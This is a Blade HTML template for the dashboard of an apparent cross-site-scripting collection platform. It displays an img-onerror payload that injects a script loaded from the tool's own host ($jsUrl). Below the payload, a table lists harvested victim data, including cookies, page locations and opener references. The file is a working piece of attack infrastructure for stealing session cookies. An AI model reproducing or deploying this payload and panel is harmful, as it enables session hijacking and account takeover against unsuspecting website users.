<!DOCTYPE html>
<html>
<head>
  <title></title>
  <script src="http://semantic-ui.com/javascript/library/jquery.min.js"></script>
  <script src="http://semantic-ui.com/dist/semantic.min.js"></script>
  <link rel="stylesheet" type="text/css" class="ui" href="http://semantic-ui.com/dist/semantic.min.css">
</head>
<body>
  <div class="ui floating message">
    {{"<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='{$jsUrl}';>"}}
  </div>
  <table class="ui celled selectable blue striped table">
    <thead>
      <tr>
      	<th>id</th>
        <th>source</th>
        <th>location</th>
        <th>cookie</th>
        <th>topLocation</th>
        <th>opener</th>
        <th>createdAt</th>
      </tr>
    </thead>
    <tbody>
      @foreach ($records as $record)
        <tr>
          <td>{{$record->id}}</td>
          <td>{{$record->source}}</td>
          <td>{{$record->location}}</td>
          <td>{{$record->cookie}}</td>
          <td>{{$record->top_location}}</td>
          <td>{{$record->opener}}</td>
          <td>{{$record->created_at}}</td>
        </tr>
      @endforeach
    </tbody>
  </table>
</body>
</html>
